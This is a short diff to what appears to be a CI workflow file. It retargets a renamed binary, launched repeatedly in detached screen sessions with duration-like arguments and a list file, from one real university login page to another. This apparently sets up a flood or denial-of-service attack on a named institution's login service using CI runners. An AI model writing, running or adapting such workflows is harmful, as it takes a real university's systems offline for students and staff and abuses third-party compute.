@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv ki o          
           
-          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 
-          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 90.txt
+          screen -dms ve ./o https://ums.paruluniversity.ac.in/Login.aspx 240 1 1 
+          screen -dms ve ./o https://ums.paruluniversity.ac.in/Login.aspx 240 1 1 90.txt
           
-          ./o https://elearning.paruluniversity.ac.in/auth/login 240 1 1  
+          ./o https://ums.paruluniversity.ac.in/Login.aspx 240 1 1  
 
           
 
